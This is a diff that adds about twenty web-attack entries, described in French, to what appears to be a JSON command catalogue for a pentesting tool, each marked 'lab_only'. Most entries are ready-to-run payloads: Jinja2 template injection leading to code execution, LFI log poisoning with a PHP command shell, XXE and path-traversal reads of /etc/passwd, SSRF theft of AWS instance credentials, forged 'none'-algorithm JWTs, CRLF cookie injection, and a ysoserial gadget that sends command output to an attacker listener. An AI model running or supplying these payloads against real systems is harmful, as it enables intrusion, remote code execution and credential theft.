@@ -1589,6 +1589,602 @@
         "misconfig"
       ],
       "execution_policy": "normal"
+    },
+    {
+      "name": "XSStrike — scanner XSS intelligent",
+      "short_name": "xsstrike.py -u",
+      "description": "Scanner XSS avancé avec fuzzing DOM, analyse de contexte et génération de payloads adaptés",
+      "command": "python3 xsstrike.py -u 'http://$TARGET/?q=test' --crawl --blind --timeout 10",
+      "purpose": "Détecter XSS réfléchies, stockées et DOM avec payloads contextuels adaptés au parseur.",
+      "expected_output": "Payload trouvé: <script>alert(1)</script> — Reflected à position 42",
+      "risks": "Envoie des payloads XSS actifs — peut déclencher WAF. Lab uniquement.",
+      "prerequisites": [
+        "XSStrike (git clone https://github.com/s0md3v/XSStrike)",
+        "Python 3"
+      ],
+      "tool_required": "python3",
+      "safe_to_run": false,
+      "dangerous": true,
+      "execution_policy": "lab_only",
+      "tags": [
+        "web",
+        "xss",
+        "scanner",
+        "fuzzing",
+        "xsstrike"
+      ],
+      "id": "web_062",
+      "category": "web_attack",
+      "requires_sudo": false
+    },
+    {
+      "name": "Dalfox — XSS scanner CLI Go",
+      "short_name": "dalfox url --blind",
+      "description": "Scanner XSS ultra-rapide en Go avec support blind XSS, pipeline et output JSON",
+      "command": "dalfox url 'http://$TARGET/?search=test' --blind $CALLBACK_URL -o /tmp/dalfox.txt --format json",
+      "purpose": "Détecter XSS réfléchi et blind XSS avec callback automatique.",
+      "expected_output": "[POC] http://target.com/?search=<script src=//callback>",
+      "risks": "Envoie des payloads actifs avec callbacks — visible dans logs cibles.",
+      "prerequisites": [
+        "dalfox (go install github.com/hahwul/dalfox/v2@latest)",
+        "$CALLBACK_URL = serveur XSS hunter"
+      ],
+      "tool_required": "dalfox",
+      "safe_to_run": false,
+      "dangerous": true,
+      "execution_policy": "lab_only",
+      "tags": [
+        "web",
+        "xss",
+        "blind-xss",
+        "dalfox",
+        "go"
+      ],
+      "id": "web_063",
+      "category": "web_attack",
+      "requires_sudo": false
+    },
+    {
+      "name": "Arjun — découverte paramètres HTTP cachés",
+      "short_name": "arjun -u -m GET,POST",
+      "description": "Bruteforce de paramètres GET/POST/JSON cachés non documentés sur un endpoint web",
+      "command": "arjun -u http://$TARGET/api/user -m GET,POST -o /tmp/arjun.json",
+      "purpose": "Découvrir des paramètres cachés comme ?debug=true, ?admin=1, ?id= non documentés.",
+      "expected_output": "Found: ['id', 'user_id', 'debug', 'token'] in GET",
+      "risks": "Génère de nombreuses requêtes variées — peut déclencher WAF ou rate limiting.",
+      "prerequisites": [
+        "arjun installé (pip install arjun)"
+      ],
+      "tool_required": "arjun",
+      "safe_to_run": false,
+      "dangerous": false,
+      "execution_policy": "lab_only",
+      "tags": [
+        "web",
+        "parameters",
+        "hidden",
+        "api",
+        "arjun"
+      ],
+      "id": "web_064",
+      "category": "web_attack",
+      "requires_sudo": false
+    },
+    {
+      "name": "Wfuzz — fuzzing web multi-paramètre",
+      "short_name": "wfuzz -c -z file",
+      "description": "Fuzzer web polyvalent pour paramètres, headers, authentification et path traversal",
+      "command": "wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt --hc 404,403 -u http://$TARGET/FUZZ -t 30",
+      "purpose": "Fuzzer endpoints, paramètres et valeurs pour trouver des comportements inattendus.",
+      "expected_output": "200  http://target.com/admin, 200 http://target.com/api, 301 http://target.com/backup",
+      "risks": "Génère beaucoup de requêtes — peut saturer l'app ou déclencher des alertes.",
+      "prerequisites": [
+        "wfuzz installé (pip install wfuzz)"
+      ],
+      "tool_required": "wfuzz",
+      "safe_to_run": false,
+      "dangerous": true,
+      "execution_policy": "lab_only",
+      "tags": [
+        "web",
+        "fuzzing",
+        "wfuzz",
+        "bruteforce",
+        "discovery"
+      ],
+      "id": "web_065",
+      "category": "web_attack",
+      "requires_sudo": false
+    },
+    {
+      "name": "SSTI — détection injection de template",
+      "short_name": "ssti math probe {{7*7}}",
+      "description": "Test d'injection de template serveur (Jinja2, Twig, Freemarker, Mako) via expressions mathématiques",
+      "command": "curl -s 'http://$TARGET/?name={{7*7}}' | grep -o '49' && echo '[+] SSTI Jinja2/Twig POSSIBLE'",
+      "purpose": "{{7*7}} évalué à 49 prouve une SSTI — peut mener au RCE via config.__class__..popen.",
+      "expected_output": "49 — [+] SSTI Jinja2/Twig POSSIBLE",
+      "risks": "Les payloads RCE Jinja2 peuvent exécuter des commandes arbitraires. Lab uniquement.",
+      "prerequisites": [
+        "curl installé"
+      ],
+      "tool_required": "curl",
+      "safe_to_run": false,
+      "dangerous": true,
+      "execution_policy": "lab_only",
+      "tags": [
+        "web",
+        "ssti",
+        "rce",
+        "template-injection",
+        "jinja2"
+      ],
+      "id": "web_066",
+      "category": "web_attack",
+      "requires_sudo": false
+    },
+    {
+      "name": "SSTI Jinja2 — RCE via config globals",
+      "short_name": "ssti rce jinja2 python",
+      "description": "Exploitation d'une SSTI Jinja2 pour exécuter des commandes OS via les globals Python",
+      "command": "curl -s 'http://$TARGET/?name={{config.__class__.__init__.__globals__[\"os\"].popen(\"id\").read()}}'",
+      "purpose": "Transformer une injection de template Jinja2 en exécution de commande arbitraire sur Flask.",
+      "expected_output": "uid=33(www-data) gid=33(www-data) groups=33(www-data)",
+      "risks": "EXÉCUTION DE CODE ARBITRAIRE — ne jamais utiliser sans autorisation écrite.",
+      "prerequisites": [
+        "cible vulnérable SSTI Jinja2 confirmée",
+        "curl installé"
+      ],
+      "tool_required": "curl",
+      "safe_to_run": false,
+      "dangerous": true,
+      "execution_policy": "lab_only",
+      "tags": [
+        "web",
+        "ssti",
+        "rce",
+        "jinja2",
+        "flask",
+        "python"
+      ],
+      "id": "web_067",
+      "category": "web_attack",
+      "requires_sudo": false
+    },
+    {
+      "name": "GraphQL — introspection dump de schéma",
+      "short_name": "graphql introspection __schema",
+      "description": "Interroge GraphQL avec une requête d'introspection pour obtenir le schéma complet",
+      "command": "curl -s -X POST http://$TARGET/graphql -H 'Content-Type: application/json' -d '{\"query\":\"{__schema{types{name fields{name args{name}}}}}\"}' | python3 -m json.tool | tee /tmp/graphql_schema.json",
+      "purpose": "Mapper toute l'API GraphQL : types, mutations, queries, arguments — base pour identifier endpoints non sécurisés.",
+      "expected_output": "JSON schema complet avec types, mutations et queries disponibles",
+      "risks": "Passif — souvent désactivé en prod mais révèle tout en dev/staging.",
+      "prerequisites": [
+        "curl et python3 installés",
+        "endpoint GraphQL accessible"
+      ],
+      "tool_required": "curl",
+      "safe_to_run": false,
+      "dangerous": false,
+      "execution_policy": "lab_only",
+      "tags": [
+        "web",
+        "graphql",
+        "api",
+        "introspection",
+        "recon"
+      ],
+      "id": "web_068",
+      "category": "web_attack",
+      "requires_sudo": false
+    },
+    {
+      "name": "JWT — attaque algorithme None (bypass auth)",
+      "short_name": "jwt none algorithm forge",
+      "description": "Forge un token JWT en remplaçant l'algorithme par 'none' pour bypasser la vérification",
+      "command": "python3 -c \"\nimport base64, json\nh=base64.urlsafe_b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).rstrip(b'=').decode()\np=base64.urlsafe_b64encode(json.dumps({'sub':'admin','role':'admin','iat':9999999999}).encode()).rstrip(b'=').decode()\nprint(f'{h}.{p}.')\n\"",
+      "purpose": "Certaines libs JWT acceptent alg:none sans signature — permet de se faire passer pour admin.",
+      "expected_output": "eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.",
+      "risks": "Token forgé — tester uniquement sur applications autorisées.",
+      "prerequisites": [
+        "python3 installé"
+      ],
+      "tool_required": "python3",
+      "safe_to_run": false,
+      "dangerous": true,
+      "execution_policy": "lab_only",
+      "tags": [
+        "web",
+        "jwt",
+        "auth-bypass",
+        "token",
+        "none-algorithm"
+      ],
+      "id": "web_069",
+      "category": "web_attack",
+      "requires_sudo": false
+    },
+    {
+      "name": "JWT Tool — crack et manipulation tokens",
+      "short_name": "jwt_tool.py -M at",
+      "description": "Swiss-army knife JWT : crack secret, forge payload, test toutes les attaques connues",
+      "command": "python3 jwt_tool.py $TOKEN -M at -p /usr/share/wordlists/rockyou.txt",
+      "purpose": "Tester toutes les attaques JWT : none alg, key confusion RS→HS, crack HMAC, injection claims.",
+      "expected_output": "Secret found: 'secret123' — ou alg confusion détectée",
+      "risks": "Requiert token valide capturé. Crack permet de forger des tokens admin.",
+      "prerequisites": [
+        "jwt_tool (git clone https://github.com/ticarpi/jwt_tool)",
+        "$TOKEN = token JWT capturé"
+      ],
+      "tool_required": "python3",
+      "safe_to_run": false,
+      "dangerous": true,
+      "execution_policy": "lab_only",
+      "tags": [
+        "web",
+        "jwt",
+        "crack",
+        "auth",
+        "token-forgery"
+      ],
+      "id": "web_070",
+      "category": "web_attack",
+      "requires_sudo": false
+    },
+    {
+      "name": "Path Traversal — lecture fichiers système (multi-encodage)",
+      "short_name": "lfi path traversal bypass",
+      "description": "Test path traversal pour lire des fichiers système via encodages multiples",
+      "command": "for p in '../../../etc/passwd' '....//....//....//etc/passwd' '%2e%2e%2f%2e%2e%2fetc%2fpasswd'; do r=$(curl -s \"http://$TARGET/?file=$p\"); echo $r | grep -q 'root:' && echo \"[+] VULN avec: $p\" && echo \"$r\" | head -2; done",
+      "purpose": "Identifier des LFI via path traversal avec bypass d'encodages URL — révèle /etc/passwd, clés SSH, .env.",
+      "expected_output": "[+] VULN avec: ../../../etc/passwd — root:x:0:0:root:/root:/bin/bash",
+      "risks": "Accès aux fichiers système — peut révéler clés privées SSH, configs avec credentials.",
+      "prerequisites": [
+        "curl installé",
+        "endpoint avec paramètre de fichier"
+      ],
+      "tool_required": "curl",
+      "safe_to_run": false,
+      "dangerous": true,
+      "execution_policy": "lab_only",
+      "tags": [
+        "web",
+        "lfi",
+        "path-traversal",
+        "file-read",
+        "bypass"
+      ],
+      "id": "web_071",
+      "category": "web_attack",
+      "requires_sudo": false
+    },
+    {
+      "name": "Log Poisoning — LFI vers RCE via auth.log",
+      "short_name": "lfi log poisoning ssh",
+      "description": "Empoisonne le log SSH puis l'inclut via LFI pour exécuter du PHP arbitraire",
+      "command": "ssh '<?php passthru($_GET[\"cmd\"]); ?>'@$TARGET; curl -s 'http://$TARGET/?file=../../../../var/log/auth.log&cmd=id'",
+      "purpose": "Chainer LFI + log poisoning : PHP injecté dans auth.log via SSH, puis exécuté par LFI.",
+      "expected_output": "uid=33(www-data) gid=33(www-data)",
+      "risks": "EXÉCUTION DE CODE — technique avancée LFI→RCE. Lab uniquement.",
+      "prerequisites": [
+        "LFI confirmée sur /var/log/auth.log",
+        "Port SSH accessible",
+        "PHP exécuté par le serveur web"
+      ],
+      "tool_required": "curl",
+      "safe_to_run": false,
+      "dangerous": true,
+      "execution_policy": "lab_only",
+      "tags": [
+        "web",
+        "lfi",
+        "rce",
+        "log-poisoning",
+        "php",
+        "chaining"
+      ],
+      "id": "web_072",
+      "category": "web_attack",
+      "requires_sudo": false
+    },
+    {
+      "name": "SSRF — scan réseau interne",
+      "short_name": "ssrf internal network scan",
+      "description": "Exploite une SSRF pour scanner le réseau interne via manipulation des schémas d'URL",
+      "command": "for ip in $(seq 1 254); do r=$(curl -s -m 3 \"http://$TARGET/fetch?url=http://192.168.1.$ip/\"); [ -n \"$r\" ] && echo \"[+] 192.168.1.$ip: ${r:0:80}\"; done",
+      "purpose": "Une SSRF permet d'atteindre des services internes (redis, Elastic, AWS metadata) non exposés.",
+      "expected_output": "[+] 192.168.1.10: {\"status\":\"ok\",\"service\":\"internal-api\"}",
+      "risks": "Peut exposer AWS metadata (credentials IAM), services internes, LDAP, et mener au RCE.",
+      "prerequisites": [
+        "curl installé",
+        "SSRF confirmée sur le paramètre url/src/path"
+      ],
+      "tool_required": "curl",
+      "safe_to_run": false,
+      "dangerous": true,
+      "execution_policy": "lab_only",
+      "tags": [
+        "web",
+        "ssrf",
+        "internal-network",
+        "aws",
+        "bypass"
+      ],
+      "id": "web_073",
+      "category": "web_attack",
+      "requires_sudo": false
+    },
+    {
+      "name": "SSRF — vol credentials AWS IMDSv1",
+      "short_name": "ssrf aws imds credentials",
+      "description": "Exploite SSRF pour atteindre l'API IMDS AWS et voler les credentials IAM de l'instance",
+      "command": "curl -s 'http://$TARGET/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/' && curl -s 'http://$TARGET/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME'",
+      "purpose": "L'IMDS AWS retourne des credentials IAM temporaires — accès complet aux services AWS.",
+      "expected_output": "{\"AccessKeyId\":\"ASIA...\",\"SecretAccessKey\":\"...\",\"Token\":\"...\"}",
+      "risks": "CRITIQUE — credentials IAM permettent un accès complet aux ressources AWS.",
+      "prerequisites": [
+        "SSRF confirmée",
+        "Cible hébergée sur AWS EC2",
+        "$ROLE_NAME depuis la première requête"
+      ],
+      "tool_required": "curl",
+      "safe_to_run": false,
+      "dangerous": true,
+      "execution_policy": "lab_only",
+      "tags": [
+        "web",
+        "ssrf",
+        "aws",
+        "imds",
+        "iam",
+        "cloud"
+      ],
+      "id": "web_074",
+      "category": "web_attack",
+      "requires_sudo": false
+    },
+    {
+      "name": "NoSQLMap — injection MongoDB auth bypass",
+      "short_name": "nosqlmap -u --attack",
+      "description": "Teste des injections NoSQL contre MongoDB pour bypasser l'authentification",
+      "command": "python3 nosqlmap.py -u 'http://$TARGET/login' --attack 2 --mongohost $TARGET --mongoport 27017",
+      "purpose": "Les apps MongoDB vulnérables à {$ne: null} ou {$regex: .*} permettent bypass d'authentification.",
+      "expected_output": "Vulnerable to NoSQL injection! Authentication bypassed: user=admin",
+      "risks": "Peut corrompre des documents ou extraire toute la base si injection exploitée.",
+      "prerequisites": [
+        "NoSQLMap (git clone https://github.com/codingo/NoSQLMap)",
+        "Python 3"
+      ],
+      "tool_required": "python3",
+      "safe_to_run": false,
+      "dangerous": true,
+      "execution_policy": "lab_only",
+      "tags": [
+        "web",
+        "nosql",
+        "mongodb",
+        "injection",
+        "auth-bypass"
+      ],
+      "id": "web_075",
+      "category": "web_attack",
+      "requires_sudo": false
+    },
+    {
+      "name": "CORS — test mauvaise configuration",
+      "short_name": "cors misconfiguration reflect",
+      "description": "Teste si le serveur reflète des origines arbitraires dans Access-Control-Allow-Origin",
+      "command": "curl -s -H 'Origin: https://evil.com' -I http://$TARGET/api/user | grep -i 'access-control' && echo '[+] CORS VULNÉRABLE'",
+      "purpose": "Un CORS mal configuré (reflect-all) permet à un site malveillant de lire les réponses API.",
+      "expected_output": "Access-Control-Allow-Origin: https://evil.com — [+] CORS VULNÉRABLE",
+      "risks": "Passif — confirme vulnérabilité CORS exploitable via PoC JavaScript.",
+      "prerequisites": [
+        "curl installé"
+      ],
+      "tool_required": "curl",
+      "safe_to_run": false,
+      "dangerous": false,
+      "execution_policy": "lab_only",
+      "tags": [
+        "web",
+        "cors",
+        "misconfiguration",
+        "api",
+        "csrf"
+      ],
+      "id": "web_076",
+      "category": "web_attack",
+      "requires_sudo": false
+    },
+    {
+      "name": "XXE — injection entité XML exfiltration fichier",
+      "short_name": "xxe file read injection",
+      "description": "Injection d'entité XML externe pour lire des fichiers arbitraires sur le serveur",
+      "command": "curl -s -X POST http://$TARGET/api/xml -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>'",
+      "purpose": "Les parseurs XML sans SecureProcessing évaluent les entités externes — lecture de fichiers système.",
+      "expected_output": "root:x:0:0:root:/root:/bin/bash dans la réponse",
+      "risks": "Peut lire tous les fichiers accessibles au processus web — clés SSH, .env, etc.",
+      "prerequisites": [
+        "curl installé",
+        "endpoint acceptant XML confirmé"
+      ],
+      "tool_required": "curl",
+      "safe_to_run": false,
+      "dangerous": true,
+      "execution_policy": "lab_only",
+      "tags": [
+        "web",
+        "xxe",
+        "xml",
+        "file-read",
+        "owasp"
+      ],
+      "id": "web_077",
+      "category": "web_attack",
+      "requires_sudo": false
+    },
+    {
+      "name": "CRLF Injection — injection headers HTTP",
+      "short_name": "crlf header injection %0d%0a",
+      "description": "Injecte des caractères CRLF pour ajouter des headers HTTP arbitraires ou splitter la réponse",
+      "command": "curl -v 'http://$TARGET/?param=test%0d%0aSet-Cookie:%20sessionid=evil;%20httponly' 2>&1 | grep -i 'set-cookie'",
+      "purpose": "CRLF permet d'injecter des headers comme Set-Cookie pour hijacker des sessions ou du cache poisoning.",
+      "expected_output": "Set-Cookie: sessionid=evil; httponly — Headers injectés dans la réponse",
+      "risks": "Peut mener à XSS via header injection, cache poisoning, ou session fixation.",
+      "prerequisites": [
+        "curl installé"
+      ],
+      "tool_required": "curl",
+      "safe_to_run": false,
+      "dangerous": true,
+      "execution_policy": "lab_only",
+      "tags": [
+        "web",
+        "crlf",
+        "header-injection",
+        "cache-poisoning",
+        "session"
+      ],
+      "id": "web_078",
+      "category": "web_attack",
+      "requires_sudo": false
+    },
+    {
+      "name": "Open Redirect — bypass whitelist domaine",
+      "short_name": "open redirect bypass encodings",
+      "description": "Teste des techniques de bypass d'open redirect pour rediriger vers un domaine arbitraire",
+      "command": "for p in 'https://evil.com' '//evil.com' 'https://target.com@evil.com'; do echo \"[*] $p\"; curl -s -o /dev/null -w '%{redirect_url}\\n' \"http://$TARGET/redirect?url=$p\"; done",
+      "purpose": "Les open redirects permettent du phishing crédible, OAuth token theft, SSRF bypass.",
+      "expected_output": "redirect_url: https://evil.com — Open redirect confirmé",
+      "risks": "Passif en test — exploitation réelle nécessite interaction utilisateur.",
+      "prerequisites": [
+        "curl installé",
+        "endpoint avec paramètre de redirection"
+      ],
+      "tool_required": "curl",
+      "safe_to_run": false,
+      "dangerous": false,
+      "execution_policy": "lab_only",
+      "tags": [
+        "web",
+        "open-redirect",
+        "phishing",
+        "oauth",
+        "bypass"
+      ],
+      "id": "web_079",
+      "category": "web_attack",
+      "requires_sudo": false
+    },
+    {
+      "name": "Deserialization — ysoserial payload Java",
+      "short_name": "ysoserial CommonsCollections",
+      "description": "Génère un payload Java deserialization pour exécuter une commande via gadget chains",
+      "command": "java -jar ysoserial.jar CommonsCollections6 'curl http://$LHOST:$LPORT/$(id|base64)' | base64 -w 0 | tee /tmp/yso_payload.b64",
+      "purpose": "Les apps Java qui désérialisent des données non fiables (JRE serialization) sont vulnérables au RCE.",
+      "expected_output": "Base64 du payload — à injecter dans cookie/paramètre de l'application vulnérable",
+      "risks": "EXÉCUTION DE CODE ARBITRAIRE — payload actif. Ne jamais envoyer à des systèmes non autorisés.",
+      "prerequisites": [
+        "Java JDK",
+        "ysoserial.jar (https://github.com/frohoff/ysoserial)",
+        "$LHOST/$LPORT = votre listener"
+      ],
+      "tool_required": "java",
+      "safe_to_run": false,
+      "dangerous": true,
+      "execution_policy": "lab_only",
+      "tags": [
+        "web",
+        "java",
+        "deserialization",
+        "ysoserial",
+        "rce",
+        "gadget-chain"
+      ],
+      "id": "web_080",
+      "category": "web_attack",
+      "requires_sudo": false
+    },
+    {
+      "name": "WPScan — scan WordPress agressif",
+      "short_name": "wpscan --enumerate agressif",
+      "description": "Scan complet WordPress : plugins vulnérables, thèmes, users, configs et clés API",
+      "command": "wpscan --url http://$TARGET --enumerate p,t,u,cb,dbe --plugins-detection aggressive --api-token $WPSCAN_TOKEN -o /tmp/wpscan.txt",
+      "purpose": "Identifier plugins WordPress vulnérables (CVE), utilisateurs énumérables, xmlrpc actif.",
+      "expected_output": "[+] Plugin: contact-form-7 | CVE-2021-XXXX — Unauthenticated File Upload",
+      "risks": "Mode agressif — très visible, déclenche WAF. wpscan.io gratuit requis pour CVE.",
+      "prerequisites": [
+        "wpscan installé (gem install wpscan)",
+        "WPSCAN_TOKEN depuis wpscan.io"
+      ],
+      "tool_required": "wpscan",
+      "safe_to_run": false,
+      "dangerous": true,
+      "execution_policy": "lab_only",
+      "tags": [
+        "web",
+        "wordpress",
+        "cms",
+        "wpscan",
+        "plugin",
+        "enumeration"
+      ],
+      "id": "web_081",
+      "category": "web_attack",
+      "requires_sudo": false
+    },
+    {
+      "name": "Subdomain Takeover — détection CNAME dangling",
+      "short_name": "subzy run --targets",
+      "description": "Détecte des sous-domaines pointant vers des services cloud non revendiqués",
+      "command": "subzy run --targets /tmp/subfinder_$TARGET.txt --concurrency 100 --output /tmp/takeover.txt --vuln",
+      "purpose": "Un CNAME vers *.github.io ou *.s3.amazonaws.com non revendiqué permet prise de contrôle.",
+      "expected_output": "[VULNERABLE] dev.target.com → target.github.io (not claimed)",
+      "risks": "La prise de contrôle effective permet XSS sur cookie parent, phishing crédible.",
+      "prerequisites": [
+        "subzy installé (go install github.com/LukaSikic/subzy@latest)",
+        "liste sous-domaines"
+      ],
+      "tool_required": "subzy",
+      "safe_to_run": false,
+      "dangerous": true,
+      "execution_policy": "lab_only",
+      "tags": [
+        "web",
+        "subdomain-takeover",
+        "dns",
+        "cname",
+        "cloud"
+      ],
+      "id": "web_082",
+      "category": "web_attack",
+      "requires_sudo": false
+    },
+    {
+      "name": "Prototype Pollution — test Node.js __proto__",
+      "short_name": "prototype pollution json",
+      "description": "Teste la pollution de prototype JavaScript via corps JSON ou paramètres GET",
+      "command": "curl -s -X POST http://$TARGET/api -H 'Content-Type: application/json' -d '{\"__proto__\":{\"isAdmin\":true,\"polluted\":\"yes\"}}' | python3 -m json.tool",
+      "purpose": "__proto__ dans JSON peut modifier Object.prototype de toute la VM Node.js — bypass ACL, RCE potentiel.",
+      "expected_output": "{\"isAdmin\": true} visible sans credentials dans requête suivante",
+      "risks": "Peut corrompre l'état global de l'application Node.js — instabilité serveur possible.",
+      "prerequisites": [
+        "curl et python3 installés",
+        "Application Node.js/Express cible"
+      ],
+      "tool_required": "curl",
+      "safe_to_run": false,
+      "dangerous": true,
+      "execution_policy": "lab_only",
+      "tags": [
+        "web",
+        "nodejs",
+        "prototype-pollution",
+        "javascript",
+        "bypass"
+      ],
+      "id": "web_083",
+      "category": "web_attack",
+      "requires_sudo": false
     }
   ]
 }
